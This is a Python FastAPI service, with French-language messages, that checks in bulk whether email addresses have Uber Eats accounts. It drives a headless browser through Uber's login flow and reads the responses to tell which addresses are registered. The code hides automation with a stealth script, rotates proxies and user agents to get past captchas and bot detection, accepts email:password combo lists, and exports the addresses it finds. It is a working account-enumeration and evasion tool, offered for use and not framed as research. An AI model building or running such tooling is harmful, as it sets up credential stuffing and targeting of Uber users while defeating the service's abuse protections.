from fastapi import FastAPI, APIRouter, UploadFile, File, HTTPException, BackgroundTasks
from fastapi.responses import StreamingResponse
from dotenv import load_dotenv
from starlette.middleware.cors import CORSMiddleware
from motor.motor_asyncio import AsyncIOMotorClient
import os
import logging
import asyncio
import random
import re
from pathlib import Path
from pydantic import BaseModel, Field
from typing import List, Optional, Dict, Any
import uuid
from datetime import datetime, timezone
import csv
import io
import json
import gc

# Playwright for Uber Eats checking
from playwright.async_api import async_playwright, Browser, BrowserContext

ROOT_DIR = Path(__file__).parent
load_dotenv(ROOT_DIR / '.env')

# MongoDB connection
mongo_url = os.environ['MONGO_URL']
client = AsyncIOMotorClient(mongo_url)
db = client[os.environ.get('DB_NAME', 'uber_checker')]

# Create the main app
app = FastAPI(title="Uber Eats Checker API")

# Create a router with the /api prefix
api_router = APIRouter(prefix="/api")


# ============ STEALTH CONFIG ============

STEALTH_SCRIPT = """
    Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
    Object.defineProperty(navigator, 'plugins', {get: () => [1, 2, 3, 4, 5]});
    Object.defineProperty(navigator, 'languages', {get: () => ['en-US', 'en']});
    window.chrome = {runtime: {}, loadTimes: function(){}, csi: function(){}};
    const originalQuery = window.navigator.permissions.query;
    window.navigator.permissions.query = (parameters) => (
        parameters.name === 'notifications' ?
            Promise.resolve({ state: Notification.permission }) :
            originalQuery(parameters)
    );
    delete navigator.__proto__.webdriver;
"""

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
]

VIEWPORTS = [
    {"width": 1920, "height": 1080},
    {"width": 1366, "height": 768},
    {"width": 1536, "height": 864},
    {"width": 1440, "height": 900},
    {"width": 1280, "height": 720},
]

TIMEZONES = ["America/New_York", "America/Chicago", "America/Los_Angeles", "Europe/London", "Europe/Paris"]


# ============ PROXY MANAGER ============

class ProxyManager:
    """Manages rotating proxies for requests"""
    
    def __init__(self):
        self.proxies: List[Dict[str, Any]] = []
        self.current_index = 0
        self.max_failures = 5
    
    def add_proxy(self, proxy_url: str, proxy_type: str = "auto") -> Dict[str, Any]:
        """Add a proxy to the pool"""
        proxy_data = self._parse_proxy(proxy_url, proxy_type)
        if proxy_data:
            for p in self.proxies:
                if p["host"] == proxy_data["host"] and p["port"] == proxy_data["port"]:
                    return {"success": False, "error": "Proxy already exists"}
            
            proxy_data["id"] = str(uuid.uuid4())
            proxy_data["added_at"] = datetime.now(timezone.utc).isoformat()
            proxy_data["requests"] = 0
            proxy_data["failures"] = 0
            proxy_data["successes"] = 0
            proxy_data["status"] = "active"
            self.proxies.append(proxy_data)
            return {"success": True, "proxy": proxy_data}
        return {"success": False, "error": "Invalid proxy format"}
    
    def _parse_proxy(self, proxy_url: str, proxy_type: str) -> Optional[Dict[str, Any]]:
        """Parse proxy URL into components"""
        proxy_url = proxy_url.strip()
        
        protocol = None
        if proxy_url.startswith("http://"):
            protocol = "http"
            proxy_url = proxy_url[7:]
        elif proxy_url.startswith("https://"):
            protocol = "http"
            proxy_url = proxy_url[8:]
        elif proxy_url.startswith("socks4://"):
            protocol = "socks4"
            proxy_url = proxy_url[9:]
        elif proxy_url.startswith("socks5://"):
            protocol = "socks5"
            proxy_url = proxy_url[9:]
        
        if proxy_type != "auto" and proxy_type in ["http", "https", "socks4", "socks5"]:
            protocol = proxy_type if proxy_type != "https" else "http"
        elif protocol is None:
            protocol = "http"
        
        username = None
        password = None
        host = None
        port = None
        
        if "@" in proxy_url:
            auth_part, host_part = proxy_url.rsplit("@", 1)
            if ":" in auth_part:
                username, password = auth_part.split(":", 1)
        else:
            host_part = proxy_url
        
        parts = host_part.split(":")
        if len(parts) == 2:
            host, port = parts
        elif len(parts) == 4:
            host, port, username, password = parts
        else:
            return None
        
        try:
            port = int(port)
        except ValueError:
            return None
        
        return {
            "protocol": protocol,
            "host": host,
            "port": port,
            "username": username,
            "password": password,
            "url": self._build_proxy_url(protocol, host, port, username, password)
        }
    
    def _build_proxy_url(self, protocol: str, host: str, port: int, username: str = None, password: str = None) -> str:
        if username and password:
            return f"{protocol}://{username}:{password}@{host}:{port}"
        return f"{protocol}://{host}:{port}"
    
    def remove_proxy(self, proxy_id: str) -> bool:
        for i, proxy in enumerate(self.proxies):
            if proxy["id"] == proxy_id:
                self.proxies.pop(i)
                return True
        return False
    
    def get_next_proxy(self) -> Optional[Dict[str, Any]]:
        """Get next proxy in rotation (round-robin)"""
        if not self.proxies:
            return None
        
        active_proxies = [p for p in self.proxies if p["status"] == "active"]
        if not active_proxies:
            for p in self.proxies:
                p["status"] = "active"
                p["failures"] = 0
            active_proxies = self.proxies
        
        if not active_proxies:
            return None
        
        self.current_index = (self.current_index + 1) % len(active_proxies)
        proxy = active_proxies[self.current_index]
        proxy["requests"] += 1
        return proxy
    
    def get_random_proxy(self) -> Optional[Dict[str, Any]]:
        """Get a random active proxy"""
        active_proxies = [p for p in self.proxies if p["status"] == "active"]
        if not active_proxies:
            return None
        proxy = random.choice(active_proxies)
        proxy["requests"] += 1
        return proxy
    
    def mark_failure(self, proxy_id: str):
        for proxy in self.proxies:
            if proxy["id"] == proxy_id:
                proxy["failures"] += 1
                if proxy["failures"] >= self.max_failures:
                    proxy["status"] = "inactive"
                break
    
    def mark_success(self, proxy_id: str):
        for proxy in self.proxies:
            if proxy["id"] == proxy_id:
                proxy["successes"] += 1
                proxy["failures"] = max(0, proxy["failures"] - 1)
                proxy["status"] = "active"
                break
    
    def get_all_proxies(self) -> List[Dict[str, Any]]:
        return [{
            "id": p["id"],
            "host": p["host"],
            "port": p["port"],
            "protocol": p["protocol"],
            "has_auth": bool(p.get("username")),
            "status": p["status"],
            "requests": p["requests"],
            "successes": p.get("successes", 0),
            "failures": p["failures"],
            "added_at": p["added_at"]
        } for p in self.proxies]
    
    def clear_all(self):
        self.proxies = []
        self.current_index = 0
    
    def get_playwright_proxy(self) -> Optional[Dict[str, str]]:
        """Get proxy formatted for Playwright"""
        proxy = self.get_next_proxy()
        if proxy:
            pw_proxy = {"server": f"{proxy['protocol']}://{proxy['host']}:{proxy['port']}"}
            if proxy.get("username") and proxy.get("password"):
                pw_proxy["username"] = proxy["username"]
                pw_proxy["password"] = proxy["password"]
            return pw_proxy, proxy["id"]
        return None, None


# Global proxy manager
proxy_manager = ProxyManager()


# ============ BROWSER MANAGER ============

class BrowserManager:
    """Manages a persistent Playwright browser instance for Uber checks"""
    
    def __init__(self):
        self.playwright = None
        self.browser: Optional[Browser] = None
        self._lock = asyncio.Lock()
        self._initialized = False
    
    async def initialize(self):
        """Initialize the browser (called once at startup)"""
        if self._initialized:
            return
        async with self._lock:
            if self._initialized:
                return
            try:
                self.playwright = await async_playwright().start()
                self.browser = await self.playwright.chromium.launch(
                    headless=True,
                    args=[
                        '--no-sandbox',
                        '--disable-setuid-sandbox',
                        '--disable-dev-shm-usage',
                        '--disable-blink-features=AutomationControlled',
                    ]
                )
                self._initialized = True
                logging.info("Browser initialized successfully")
            except Exception as e:
                logging.error(f"Failed to initialize browser: {e}")
                raise
    
    async def create_context(self, proxy: Optional[Dict] = None) -> BrowserContext:
        """Create a new browser context with stealth and optional proxy"""
        if not self._initialized:
            await self.initialize()
        
        context_options = {
            "user_agent": random.choice(USER_AGENTS),
            "viewport": random.choice(VIEWPORTS),
            "locale": "en-US",
            "timezone_id": random.choice(TIMEZONES),
            "color_scheme": "light",
        }
        
        if proxy:
            context_options["proxy"] = proxy
        
        context = await self.browser.new_context(**context_options)
        await context.add_init_script(STEALTH_SCRIPT)
        return context
    
    async def shutdown(self):
        """Close the browser"""
        if self.browser:
            await self.browser.close()
        if self.playwright:
            await self.playwright.stop()
        self._initialized = False


# Global browser manager
browser_manager = BrowserManager()


# ============ UBER EATS CHECKER ============

async def check_uber_eats_email(email: str, max_retries: int = 2) -> Dict[str, Any]:
    """
    Check if an email has an Uber Eats account.
    
    Detection logic:
    - FOUND (account exists): "Welcome back" OR code sent to PHONE or Google/Apple sign-in
    - NOT FOUND: Code sent to EMAIL + "Tip!" message
    - CAPTCHA: Arkose puzzle triggered (retry with different proxy)
    """
    
    last_error = None
    
    for attempt in range(max_retries + 1):
        proxy_data, proxy_id = proxy_manager.get_playwright_proxy()
        
        try:
            result = await _do_uber_check(email, proxy_data)
            
            if result["status"] == "captcha" and attempt < max_retries:
                # Retry with different proxy
                if proxy_id:
                    proxy_manager.mark_failure(proxy_id)
                logging.info(f"Captcha for {email}, retrying (attempt {attempt+1}/{max_retries})")
                await asyncio.sleep(random.uniform(1, 3))
                continue
            
            if proxy_id and result["status"] != "captcha":
                proxy_manager.mark_success(proxy_id)
            
            return result
            
        except Exception as e:
            last_error = str(e)
            if proxy_id:
                proxy_manager.mark_failure(proxy_id)
            logging.error(f"Uber check error for {email} (attempt {attempt+1}): {e}")
            if attempt < max_retries:
                await asyncio.sleep(random.uniform(1, 2))
                continue
    
    return {
        "email": email,
        "status": "error",
        "exists": False,
        "details": last_error or "Max retries exceeded",
        "platform": "uber_eats"
    }


async def _do_uber_check(email: str, proxy: Optional[Dict] = None) -> Dict[str, Any]:
    """Perform the actual Uber Eats check using Playwright"""
    
    context = await browser_manager.create_context(proxy)
    page = await context.new_page()
    
    try:
        # Navigate to Uber auth page
        await page.goto(
            "https://auth.uber.com/v2/?breeze_local_zone=dca17&next_url=https%3A%2F%2Fwww.ubereats.com%2F",
            timeout=25000
        )
        
        # Wait for email input
        await page.wait_for_selector('#PHONE_NUMBER_or_EMAIL_ADDRESS', timeout=15000)
        
        # Human-like interaction
        await asyncio.sleep(random.uniform(0.5, 1.0))
        
        # Type email character by character (triggers React state updates)
        await page.click('#PHONE_NUMBER_or_EMAIL_ADDRESS')
        await asyncio.sleep(0.3)
        await page.type('#PHONE_NUMBER_or_EMAIL_ADDRESS', email, delay=random.randint(40, 80))
        
        await asyncio.sleep(random.uniform(0.8, 1.5))
        
        # Click the Continue button
        try:
            await page.click('button[type="submit"]', timeout=5000)
        except Exception:
            try:
                await page.press('#PHONE_NUMBER_or_EMAIL_ADDRESS', 'Enter')
            except Exception:
                return {"email": email, "status": "error", "exists": False, "details": "Could not submit", "platform": "uber_eats"}
        
        # Wait for the page to change - look for new content
        try:
            await page.wait_for_function("""
                () => {
                    const text = document.body.innerText.toLowerCase();
                    return !text.includes("what's your phone number") && (
                        text.includes('welcome back') || 
                        text.includes('enter the') ||
                        text.includes('protecting') ||
                        text.includes('puzzle') ||
                        text.includes('sign in with') ||
                        text.includes('code') ||
                        text.includes('verify')
                    );
                }
            """, timeout=20000)
        except Exception:
            # Page might not have changed - possible captcha or error
            pass
        
        await asyncio.sleep(random.uniform(2, 3))
        
        # Get VISIBLE page text only (not hidden JSON/scripts)
        try:
            text = await page.evaluate("""
                () => {
                    const body = document.body;
                    const walker = document.createTreeWalker(body, NodeFilter.SHOW_TEXT, {
                        acceptNode: function(node) {
                            const el = node.parentElement;
                            if (!el) return NodeFilter.FILTER_REJECT;
                            if (el.tagName === 'SCRIPT' || el.tagName === 'STYLE' || el.tagName === 'NOSCRIPT') return NodeFilter.FILTER_REJECT;
                            const txt = node.textContent.trim();
                            if (!txt || txt.length < 2) return NodeFilter.FILTER_REJECT;
                            if (txt.startsWith('{') && txt.includes('"')) return NodeFilter.FILTER_REJECT;
                            if (txt.startsWith('[{') && txt.includes('"')) return NodeFilter.FILTER_REJECT;
                            return NodeFilter.FILTER_ACCEPT;
                        }
                    });
                    let result = '';
                    while (walker.nextNode()) {
                        result += walker.currentNode.textContent.trim() + ' ';
                    }
                    return result.substring(0, 2000).trim();
                }
            """)
        except Exception:
            raw_text = await page.text_content("body") or ""
            # Keep only first 2000 chars and remove JSON blocks
            text = re.sub(r'\{[^}]{50,}\}', '', raw_text[:3000])
        
        if not text or len(text.strip()) < 5:
            return {"email": email, "status": "error", "exists": False, "details": "Empty page", "platform": "uber_eats"}
        
        lower_text = text.lower()
        logging.info(f"[UberCheck] {email} - Visible text ({len(text)} chars): {text[:200]}")
        
        # === DETECTION LOGIC ===
        
        # 0. Page didn't advance (still on initial login)
        if "what's your phone number" in lower_text or "what\u2019s your phone" in lower_text:
            return {"email": email, "status": "captcha", "exists": False, "details": "Page didn't advance (captcha/bot detection)", "platform": "uber_eats"}
        
        # 1. CAPTCHA detected
        if "protecting your account" in lower_text or "solve this puzzle" in lower_text:
            return {"email": email, "status": "captcha", "exists": False, "details": "Arkose captcha triggered", "platform": "uber_eats"}
        
        # 2. FOUND: "Welcome back" with user name
        if "welcome back" in lower_text:
            # Extract name if possible
            name_match = re.search(r'welcome back,?\s*([^.!]+)', text, re.I)
            name = name_match.group(1).strip() if name_match else ""
            return {"email": email, "status": "found", "exists": True, "details": f"Welcome back{', ' + name if name else ''}", "platform": "uber_eats"}
        
        # 3. FOUND: Code sent to phone number (not email)
        # Pattern: "sent to +33..." or "sent to (***) ***-**XX" or "envoyé au +33..."
        phone_patterns = [
            r'sent to \+\d',           # sent to +33...
            r'sent to \(\*',           # sent to (***) ***-
            r'envoy[eé] au \+\d',      # French
            r'sent to.*\*\*\*',        # masked phone
            r'code.*(?:phone|t[eé]l[eé]phone|mobile)',  # mentions phone
        ]
        for pattern in phone_patterns:
            if re.search(pattern, lower_text):
                return {"email": email, "status": "found", "exists": True, "details": "Code sent to phone number", "platform": "uber_eats"}
        
        # 4. FOUND: Asked to sign in with Google/Apple (as primary auth method, not just options)
        # If page shows ONLY Google/Apple sign-in (not the initial page with all options)
        if ("sign in with google" in lower_text or "sign in with apple" in lower_text or 
            "connecter avec google" in lower_text or "connecter avec apple" in lower_text or
            "se connecter avec" in lower_text):
            # Make sure it's not the initial login page (which always shows these options)
            if "what's your phone" not in lower_text and "enter phone" not in lower_text:
                return {"email": email, "status": "found", "exists": True, "details": "Google/Apple sign-in required", "platform": "uber_eats"}
        
        # 5. NOT FOUND: Generic code sent to EMAIL + "Tip" message
        has_code_entry = "enter the" in lower_text and "digit code" in lower_text
        has_tip = "tip" in lower_text and ("check your inbox" in lower_text or "spam" in lower_text or "dossier" in lower_text)
        sent_to_email = email.lower() in lower_text
        
        if has_code_entry and has_tip and sent_to_email:
            return {"email": email, "status": "not_found", "exists": False, "details": "Code sent to email + Tip (no account)", "platform": "uber_eats"}
        
        # 6. If code entry but NO Tip and sent to email - might still exist
        if has_code_entry and sent_to_email and not has_tip:
            return {"email": email, "status": "found", "exists": True, "details": "Code sent (no Tip = account exists)", "platform": "uber_eats"}
        
        # 7. Code entry with Tip but not to this email (sent to another email/phone)
        if has_code_entry and not sent_to_email:
            return {"email": email, "status": "found", "exists": True, "details": "Code sent to different contact", "platform": "uber_eats"}
        
        # 8. Unknown response - report as unverifiable
        return {"email": email, "status": "unverifiable", "exists": False, "details": "Could not determine", "platform": "uber_eats"}
    
    except Exception as e:
        return {"email": email, "status": "error", "exists": False, "details": str(e)[:100], "platform": "uber_eats"}
    
    finally:
        await context.close()


# ============ JOB MANAGER ============

class JobManager:
    """Manages background verification jobs"""
    
    def __init__(self):
        self.jobs: Dict[str, Dict[str, Any]] = {}
        self.results_dir = Path("/tmp/uber_jobs")
        self.results_dir.mkdir(exist_ok=True)
    
    def create_job(self, total: int, filename: str = "") -> str:
        job_id = str(uuid.uuid4())
        self.jobs[job_id] = {
            "id": job_id,
            "status": "pending",
            "total": total,
            "processed": 0,
            "found": 0,
            "not_found": 0,
            "captcha": 0,
            "errors": 0,
            "filename": filename,
            "created_at": datetime.now(timezone.utc).isoformat(),
            "started_at": None,
            "completed_at": None,
            "results_file": str(self.results_dir / f"{job_id}.jsonl"),
            "found_file": str(self.results_dir / f"{job_id}_found.txt"),
        }
        return job_id
    
    def get_job(self, job_id: str) -> Optional[Dict[str, Any]]:
        return self.jobs.get(job_id)
    
    def update_job(self, job_id: str, **kwargs):
        if job_id in self.jobs:
            self.jobs[job_id].update(kwargs)
    
    def add_result(self, job_id: str, result: Dict[str, Any]):
        if job_id not in self.jobs:
            return
        
        job = self.jobs[job_id]
        job["processed"] += 1
        
        status = result.get("status", "error")
        if status == "found":
            job["found"] += 1
        elif status == "not_found":
            job["not_found"] += 1
        elif status == "captcha":
            job["captcha"] += 1
        else:
            job["errors"] += 1
        
        # Write to results file
        with open(job["results_file"], "a", encoding="utf-8") as f:
            f.write(json.dumps(result, ensure_ascii=False) + "\n")
        
        # Write found emails to separate file
        if status == "found":
            with open(job["found_file"], "a", encoding="utf-8") as f:
                f.write(result["email"] + "\n")


job_manager = JobManager()


# ============ MODELS ============

class VerificationRequest(BaseModel):
    emails: List[str]

class ProxyAddRequest(BaseModel):
    proxies: List[str]
    proxy_type: str = "auto"

class CheckResult(BaseModel):
    email: str
    status: str
    exists: bool
    details: str
    platform: str = "uber_eats"


# ============ UTILITY FUNCTIONS ============

def parse_emails_from_content(content: str) -> List[str]:
    """Extract emails from file content"""
    emails = []
    email_pattern = re.compile(r'[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}')
    
    for line in content.split('\n'):
        line = line.strip()
        if not line:
            continue
        
        # Handle combo formats: email:password, email|password, email;password
        for sep in [':', '|', ';', '\t', ',']:
            if sep in line:
                parts = line.split(sep)
                line = parts[0].strip()
                break
        
        # Extract email
        match = email_pattern.search(line)
        if match:
            emails.append(match.group().lower())
    
    # Deduplicate while preserving order
    seen = set()
    unique = []
    for e in emails:
        if e not in seen:
            seen.add(e)
            unique.append(e)
    
    return unique


# ============ BACKGROUND JOB PROCESSING ============

async def process_job(job_id: str, emails: List[str]):
    """Process a verification job in background"""
    try:
        job_manager.update_job(job_id, status="running", started_at=datetime.now(timezone.utc).isoformat())
        
        # Concurrency based on proxy count
        active_proxies = len([p for p in proxy_manager.proxies if p["status"] == "active"])
        max_concurrent = max(2, min(active_proxies * 2, 10)) if active_proxies > 0 else 2
        
        sem = asyncio.Semaphore(max_concurrent)
        
        async def check_with_sem(email):
            async with sem:
                result = await check_uber_eats_email(email)
                job_manager.add_result(job_id, result)
                return result
        
        # Process in batches
        batch_size = max_concurrent * 3
        for i in range(0, len(emails), batch_size):
            batch = emails[i:i+batch_size]
            tasks = [check_with_sem(email) for email in batch]
            await asyncio.gather(*tasks, return_exceptions=True)
            
            # Small delay between batches
            await asyncio.sleep(random.uniform(0.5, 1.5))
            gc.collect()
        
        job_manager.update_job(job_id, status="completed", completed_at=datetime.now(timezone.utc).isoformat())
        logging.info(f"Job {job_id} completed: {len(emails)} emails processed")
        
    except Exception as e:
        logging.error(f"Job {job_id} failed: {e}")
        job_manager.update_job(job_id, status="failed")


# ============ ROUTES ============

@api_router.get("/")
async def root():
    return {
        "service": "Uber Eats Checker",
        "version": "1.0.0",
        "proxies_active": len([p for p in proxy_manager.proxies if p["status"] == "active"]),
        "proxies_total": len(proxy_manager.proxies),
    }

@api_router.get("/health")
async def health_check():
    return {
        "status": "healthy",
        "service": "Uber Eats Checker",
        "browser_ready": browser_manager._initialized,
        "proxies_active": len([p for p in proxy_manager.proxies if p["status"] == "active"]),
        "proxies_total": len(proxy_manager.proxies),
    }


# ============ PROXY ROUTES ============

@api_router.post("/proxies/add")
async def add_proxies(request: ProxyAddRequest):
    added = []
    failed = []
    
    for proxy_url in request.proxies:
        result = proxy_manager.add_proxy(proxy_url, request.proxy_type)
        if result["success"]:
            added.append(result["proxy"]["id"])
        else:
            failed.append({"url": proxy_url, "error": result["error"]})
    
    return {
        "success": len(added) > 0,
        "message": f"{len(added)} proxies ajoutés, {len(failed)} échoués",
        "added": len(added),
        "failed": len(failed),
        "proxies": proxy_manager.get_all_proxies()
    }

@api_router.get("/proxies")
async def get_proxies():
    return {
        "proxies": proxy_manager.get_all_proxies(),
        "total": len(proxy_manager.proxies),
        "active": len([p for p in proxy_manager.proxies if p["status"] == "active"])
    }

@api_router.delete("/proxies/{proxy_id}")
async def delete_proxy(proxy_id: str):
    if proxy_manager.remove_proxy(proxy_id):
        return {"success": True, "message": "Proxy supprimé"}
    raise HTTPException(status_code=404, detail="Proxy non trouvé")

@api_router.delete("/proxies")
async def clear_proxies():
    proxy_manager.clear_all()
    return {"success": True, "message": "Tous les proxies supprimés"}

@api_router.post("/proxies/test")
async def test_proxies():
    """Test all proxies connectivity"""
    import httpx
    results = []
    for proxy in proxy_manager.proxies:
        try:
            async with httpx.AsyncClient(timeout=10, proxy=proxy["url"]) as client:
                response = await client.get("https://httpbin.org/ip")
                if response.status_code == 200:
                    ip = response.json().get("origin", "unknown")
                    results.append({"id": proxy["id"], "status": "working", "ip": ip})
                    proxy_manager.mark_success(proxy["id"])
                else:
                    results.append({"id": proxy["id"], "status": "failed", "error": f"Status {response.status_code}"})
                    proxy_manager.mark_failure(proxy["id"])
        except Exception as e:
            results.append({"id": proxy["id"], "status": "failed", "error": str(e)[:80]})
            proxy_manager.mark_failure(proxy["id"])
    
    return {"results": results}


# ============ CHECK ROUTES ============

@api_router.post("/check")
async def check_emails(request: VerificationRequest):
    """Check a list of emails against Uber Eats"""
    if not request.emails:
        raise HTTPException(status_code=400, detail="Aucun email fourni")
    
    if len(request.emails) > 50:
        raise HTTPException(status_code=400, detail="Maximum 50 emails par requête. Utilisez /jobs/create pour les gros volumes.")
    
    # Process emails concurrently
    active_proxies = len([p for p in proxy_manager.proxies if p["status"] == "active"])
    max_concurrent = max(1, min(active_proxies, 5)) if active_proxies > 0 else 1
    sem = asyncio.Semaphore(max_concurrent)
    
    async def check_with_sem(email):
        async with sem:
            return await check_uber_eats_email(email.strip().lower())
    
    tasks = [check_with_sem(e) for e in request.emails if e.strip()]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    
    final_results = []
    for r in results:
        if isinstance(r, Exception):
            final_results.append({"email": "unknown", "status": "error", "exists": False, "details": str(r)[:100], "platform": "uber_eats"})
        else:
            final_results.append(r)
    
    # Stats
    found = sum(1 for r in final_results if r.get("status") == "found")
    not_found = sum(1 for r in final_results if r.get("status") == "not_found")
    captcha = sum(1 for r in final_results if r.get("status") == "captcha")
    errors = sum(1 for r in final_results if r.get("status") in ["error", "unverifiable"])
    
    return {
        "total": len(final_results),
        "found": found,
        "not_found": not_found,
        "captcha": captcha,
        "errors": errors,
        "results": final_results
    }


@api_router.post("/check/single")
async def check_single_email(email: str):
    """Check a single email"""
    if not email or "@" not in email:
        raise HTTPException(status_code=400, detail="Email invalide")
    
    result = await check_uber_eats_email(email.strip().lower())
    return result


# ============ JOB ROUTES ============

@api_router.post("/jobs/create")
async def create_job(file: UploadFile = File(...)):
    """Create a background check job from file upload"""
    allowed_types = ['.csv', '.txt', '.text']
    file_ext = Path(file.filename).suffix.lower() if file.filename else ''
    
    if file_ext not in allowed_types and file.content_type not in ['text/csv', 'text/plain']:
        raise HTTPException(status_code=400, detail="Format invalide. Acceptés : CSV, TXT")
    
    try:
        content = await file.read()
        content_str = content.decode('utf-8')
    except UnicodeDecodeError:
        try:
            content_str = content.decode('latin-1')
        except Exception:
            raise HTTPException(status_code=400, detail="Impossible de lire le fichier")
    
    emails = parse_emails_from_content(content_str)
    
    if not emails:
        raise HTTPException(status_code=400, detail="Aucun email valide trouvé dans le fichier")
    
    job_id = job_manager.create_job(len(emails), file.filename or "upload")
    
    # Start background task
    asyncio.create_task(process_job(job_id, emails))
    
    return {
        "job_id": job_id,
        "total": len(emails),
        "status": "pending",
        "message": f"Job créé pour {len(emails)} emails"
    }

@api_router.get("/jobs/{job_id}")
async def get_job_status(job_id: str):
    job = job_manager.get_job(job_id)
    if not job:
        raise HTTPException(status_code=404, detail="Job non trouvé")
    
    progress = (job["processed"] / job["total"] * 100) if job["total"] > 0 else 0
    
    return {
        "id": job["id"],
        "status": job["status"],
        "total": job["total"],
        "processed": job["processed"],
        "progress": round(progress, 1),
        "found": job["found"],
        "not_found": job["not_found"],
        "captcha": job["captcha"],
        "errors": job["errors"],
        "filename": job["filename"],
        "created_at": job["created_at"],
        "completed_at": job["completed_at"],
    }

@api_router.get("/jobs/{job_id}/results")
async def download_job_results(job_id: str):
    """Download all results as JSONL"""
    job = job_manager.get_job(job_id)
    if not job:
        raise HTTPException(status_code=404, detail="Job non trouvé")
    
    results_path = Path(job["results_file"])
    if not results_path.exists():
        raise HTTPException(status_code=404, detail="Résultats non disponibles")
    
    def iter_file():
        with open(results_path, "rb") as f:
            for chunk in iter(lambda: f.read(8192), b''):
                yield chunk
    
    return StreamingResponse(
        iter_file(),
        media_type="application/jsonl",
        headers={"Content-Disposition": f'attachment; filename="results_{job_id[:8]}.jsonl"'}
    )

@api_router.get("/jobs/{job_id}/found")
async def download_found_emails(job_id: str):
    """Download only found emails as TXT"""
    job = job_manager.get_job(job_id)
    if not job:
        raise HTTPException(status_code=404, detail="Job non trouvé")
    
    found_path = Path(job["found_file"])
    if not found_path.exists():
        raise HTTPException(status_code=404, detail="Fichier non disponible")
    
    def iter_file():
        with open(found_path, "rb") as f:
            for chunk in iter(lambda: f.read(8192), b''):
                yield chunk
    
    return StreamingResponse(
        iter_file(),
        media_type="text/plain; charset=utf-8",
        headers={"Content-Disposition": f'attachment; filename="found_{job_id[:8]}.txt"'}
    )

@api_router.get("/jobs")
async def list_jobs():
    jobs_list = []
    for job in job_manager.jobs.values():
        progress = (job["processed"] / job["total"] * 100) if job["total"] > 0 else 0
        jobs_list.append({
            "id": job["id"],
            "status": job["status"],
            "total": job["total"],
            "processed": job["processed"],
            "progress": round(progress, 1),
            "found": job["found"],
            "not_found": job["not_found"],
            "filename": job["filename"],
            "created_at": job["created_at"],
        })
    return {"jobs": sorted(jobs_list, key=lambda x: x["created_at"], reverse=True)}


# ============ APP SETUP ============

app.include_router(api_router)

app.add_middleware(
    CORSMiddleware,
    allow_credentials=True,
    allow_origins=os.environ.get('CORS_ORIGINS', '*').split(','),
    allow_methods=["*"],
    allow_headers=["*"],
)

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)


@app.on_event("startup")
async def startup():
    """Initialize browser on startup"""
    try:
        await browser_manager.initialize()
        logger.info("Uber Eats Checker ready")
    except Exception as e:
        logger.error(f"Failed to start browser: {e}")


@app.on_event("shutdown")
async def shutdown():
    """Cleanup on shutdown"""
    await browser_manager.shutdown()
    client.close()
